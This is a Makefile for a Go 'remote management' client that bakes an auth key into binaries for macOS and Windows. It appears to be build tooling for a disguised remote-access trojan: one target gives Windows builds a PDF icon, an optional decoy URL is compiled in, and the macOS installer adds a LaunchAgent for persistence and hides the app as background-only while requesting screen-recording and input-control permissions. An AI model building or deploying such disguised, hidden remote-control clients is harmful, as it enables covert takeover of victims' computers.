.PHONY: all deps admin-ui client-darwin client-windows clean

VERSION ?= 1.0.0
AUTH_KEY ?= 
DECOY_URL ?= 

all: deps

deps:
	go mod tidy

# Run the admin UI server
admin-ui:
	cd web && go run server.go

# Build the admin UI server binary
build-admin:
	go build -o bin/admin-server ./web/

# Compute DECOY_URL ldflags fragment
ifdef DECOY_URL
DECOY_FLAGS = -X 'main.DecoyURL=$(DECOY_URL)'
else
DECOY_FLAGS =
endif

# Generate Windows version resource
generate-resource:
	cd cmd/client && goversioninfo -o resource_windows.syso

# Generate Windows version resource with PDF icon (for PDFIFY builds)
generate-resource-pdf:
	cd cmd/client && sed -i '' 's/default.ico/pdf.ico/' versioninfo.json && \
		goversioninfo -o resource_windows.syso && \
		sed -i '' 's/pdf.ico/default.ico/' versioninfo.json

# Build client for macOS (Apple Silicon)
client-darwin-arm64:
ifndef AUTH_KEY
	$(error AUTH_KEY is required. Usage: make client-darwin-arm64 AUTH_KEY=tskey-auth-xxx)
endif
	GOOS=darwin GOARCH=arm64 CGO_ENABLED=0 go build \
		-ldflags "-s -w -X 'main.AuthKey=$(AUTH_KEY)' -X 'main.Version=$(VERSION)' -X 'main.BuildTime=$(shell date -u +%Y-%m-%dT%H:%M:%SZ)' $(DECOY_FLAGS)" \
		-o bin/remote-mgmt-client-darwin-arm64 \
		./cmd/client

# Build client for macOS (Intel)
client-darwin-amd64:
ifndef AUTH_KEY
	$(error AUTH_KEY is required. Usage: make client-darwin-amd64 AUTH_KEY=tskey-auth-xxx)
endif
	GOOS=darwin GOARCH=amd64 CGO_ENABLED=0 go build \
		-ldflags "-s -w -X 'main.AuthKey=$(AUTH_KEY)' -X 'main.Version=$(VERSION)' -X 'main.BuildTime=$(shell date -u +%Y-%m-%dT%H:%M:%SZ)' $(DECOY_FLAGS)" \
		-o bin/remote-mgmt-client-darwin-amd64 \
		./cmd/client

# Build client for Windows (64-bit) - auto-generates version resource
client-windows-amd64: generate-resource
ifndef AUTH_KEY
	$(error AUTH_KEY is required. Usage: make client-windows-amd64 AUTH_KEY=tskey-auth-xxx)
endif
	GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build \
		-ldflags "-s -w -X 'main.AuthKey=$(AUTH_KEY)' -X 'main.Version=$(VERSION)' -X 'main.BuildTime=$(shell date -u +%Y-%m-%dT%H:%M:%SZ)' $(DECOY_FLAGS)" \
		-o bin/remote-mgmt-client-windows-amd64.exe \
		./cmd/client
	@rm -f cmd/client/resource_windows.syso

# Build client for Windows (ARM64) - auto-generates version resource
client-windows-arm64: generate-resource
ifndef AUTH_KEY
	$(error AUTH_KEY is required. Usage: make client-windows-arm64 AUTH_KEY=tskey-auth-xxx)
endif
	GOOS=windows GOARCH=arm64 CGO_ENABLED=0 go build \
		-ldflags "-s -w -X 'main.AuthKey=$(AUTH_KEY)' -X 'main.Version=$(VERSION)' -X 'main.BuildTime=$(shell date -u +%Y-%m-%dT%H:%M:%SZ)' $(DECOY_FLAGS)" \
		-o bin/remote-mgmt-client-windows-arm64.exe \
		./cmd/client
	@rm -f cmd/client/resource_windows.syso

# Shared .pkg build variables
PKG_STAGE     = /tmp/rmgmt-pkg-stage
PKG_ID        = com.remotemgmt.client
PKG_APP_NAME  = RemoteMgmt.app
PKG_EXEC_NAME = remote-mgmt
PKG_APP_PATH  = /Applications/$(PKG_APP_NAME)
PKG_PLIST     = /Library/LaunchAgents/$(PKG_ID).plist
PKG_SED_ARGS  = -e 's|{{IDENTIFIER}}|$(PKG_ID)|g' \
                -e 's|{{PLIST_PATH}}|$(PKG_PLIST)|g' \
                -e 's|{{APP_PATH}}|$(PKG_APP_PATH)|g' \
                -e 's|{{EXEC_NAME}}|$(PKG_EXEC_NAME)|g' \
                -e 's|{{BIN_PATH}}|$(PKG_APP_PATH)/Contents/MacOS/$(PKG_EXEC_NAME)|g'

# Build macOS .pkg installer (Apple Silicon) — requires macOS host with Xcode CLI tools
client-darwin-arm64-pkg: client-darwin-arm64
	@echo "Packaging .pkg installer for darwin/arm64..."
	@rm -rf $(PKG_STAGE)
	@mkdir -p $(PKG_STAGE)/payload/Applications/$(PKG_APP_NAME)/Contents/MacOS \
		$(PKG_STAGE)/payload/Library/LaunchAgents $(PKG_STAGE)/scripts
	@cp bin/remote-mgmt-client-darwin-arm64 $(PKG_STAGE)/payload/Applications/$(PKG_APP_NAME)/Contents/MacOS/$(PKG_EXEC_NAME)
	@sed $(PKG_SED_ARGS) scripts/macos-launchagent.plist > $(PKG_STAGE)/payload/Library/LaunchAgents/$(PKG_ID).plist
	@sed $(PKG_SED_ARGS) scripts/macos-postinstall.sh > $(PKG_STAGE)/scripts/postinstall
	@chmod 755 $(PKG_STAGE)/scripts/postinstall
	@printf '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0">\n<dict>\n<key>CFBundleExecutable</key><string>$(PKG_EXEC_NAME)</string>\n<key>CFBundleIdentifier</key><string>$(PKG_ID)</string>\n<key>CFBundleName</key><string>Remote Management</string>\n<key>CFBundleDisplayName</key><string>Remote Management</string>\n<key>CFBundlePackageType</key><string>APPL</string>\n<key>CFBundleVersion</key><string>$(VERSION)</string>\n<key>CFBundleShortVersionString</key><string>$(VERSION)</string>\n<key>LSUIElement</key><true/>\n<key>LSBackgroundOnly</key><true/>\n<key>NSScreenCaptureUsageDescription</key><string>Remote Management needs Screen Recording access for remote desktop.</string>\n<key>NSAppleEventsUsageDescription</key><string>Remote Management needs to control System Events for remote input.</string>\n</dict>\n</plist>' > $(PKG_STAGE)/payload/Applications/$(PKG_APP_NAME)/Contents/Info.plist
	pkgbuild --root $(PKG_STAGE)/payload \
		--identifier $(PKG_ID) --version $(VERSION) \
		--install-location / --scripts $(PKG_STAGE)/scripts \
		bin/remote-mgmt-client-darwin-arm64.pkg
	@rm -rf $(PKG_STAGE)
	@echo "Built: bin/remote-mgmt-client-darwin-arm64.pkg"

# Build macOS .pkg installer (Intel) — requires macOS host with Xcode CLI tools
client-darwin-amd64-pkg: client-darwin-amd64
	@echo "Packaging .pkg installer for darwin/amd64..."
	@rm -rf $(PKG_STAGE)
	@mkdir -p $(PKG_STAGE)/payload/Applications/$(PKG_APP_NAME)/Contents/MacOS \
		$(PKG_STAGE)/payload/Library/LaunchAgents $(PKG_STAGE)/scripts
	@cp bin/remote-mgmt-client-darwin-amd64 $(PKG_STAGE)/payload/Applications/$(PKG_APP_NAME)/Contents/MacOS/$(PKG_EXEC_NAME)
	@sed $(PKG_SED_ARGS) scripts/macos-launchagent.plist > $(PKG_STAGE)/payload/Library/LaunchAgents/$(PKG_ID).plist
	@sed $(PKG_SED_ARGS) scripts/macos-postinstall.sh > $(PKG_STAGE)/scripts/postinstall
	@chmod 755 $(PKG_STAGE)/scripts/postinstall
	@printf '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0">\n<dict>\n<key>CFBundleExecutable</key><string>$(PKG_EXEC_NAME)</string>\n<key>CFBundleIdentifier</key><string>$(PKG_ID)</string>\n<key>CFBundleName</key><string>Remote Management</string>\n<key>CFBundleDisplayName</key><string>Remote Management</string>\n<key>CFBundlePackageType</key><string>APPL</string>\n<key>CFBundleVersion</key><string>$(VERSION)</string>\n<key>CFBundleShortVersionString</key><string>$(VERSION)</string>\n<key>LSUIElement</key><true/>\n<key>LSBackgroundOnly</key><true/>\n<key>NSScreenCaptureUsageDescription</key><string>Remote Management needs Screen Recording access for remote desktop.</string>\n<key>NSAppleEventsUsageDescription</key><string>Remote Management needs to control System Events for remote input.</string>\n</dict>\n</plist>' > $(PKG_STAGE)/payload/Applications/$(PKG_APP_NAME)/Contents/Info.plist
	pkgbuild --root $(PKG_STAGE)/payload \
		--identifier $(PKG_ID) --version $(VERSION) \
		--install-location / --scripts $(PKG_STAGE)/scripts \
		bin/remote-mgmt-client-darwin-amd64.pkg
	@rm -rf $(PKG_STAGE)
	@echo "Built: bin/remote-mgmt-client-darwin-amd64.pkg"

# Build all client platforms
clients-all: client-darwin-arm64 client-darwin-amd64 client-windows-amd64 client-windows-arm64

clean:
	rm -rf bin/
	rm -rf /tmp/rmgmt-builds-*
	rm -f cmd/client/resource_windows.syso

# Development: run client locally (requires auth key)
run-client:
ifndef AUTH_KEY
	$(error AUTH_KEY is required. Usage: make run-client AUTH_KEY=tskey-auth-xxx)
endif
	TS_AUTHKEY=$(AUTH_KEY) go run ./cmd/client

# Show help
help:
	@echo "Remote Management Tool - Build Commands"
	@echo ""
	@echo "Setup:"
	@echo "  make deps                    - Download Go dependencies"
	@echo ""
	@echo "Admin UI:"
	@echo "  make admin-ui                - Run the admin UI server (localhost:8000)"
	@echo "  make build-admin             - Build admin server binary"
	@echo ""
	@echo "Client Builds (require AUTH_KEY):"
	@echo "  make client-darwin-arm64     - Build for macOS Apple Silicon"
	@echo "  make client-darwin-amd64     - Build for macOS Intel"
	@echo "  make client-windows-amd64    - Build for Windows 64-bit"
	@echo "  make client-windows-arm64    - Build for Windows ARM"
	@echo "  make clients-all             - Build for all platforms"
	@echo ""
	@echo "macOS .pkg Installers (require AUTH_KEY, macOS host):"
	@echo "  make client-darwin-arm64-pkg  - .pkg for macOS Apple Silicon"
	@echo "  make client-darwin-amd64-pkg  - .pkg for macOS Intel"
	@echo ""
	@echo "Example:"
	@echo "  make client-darwin-arm64 AUTH_KEY=tskey-auth-kXXXXXXXXXX"
	@echo ""
	@echo "Other:"
	@echo "  make clean                   - Remove built binaries"
	@echo "  make help                    - Show this help"
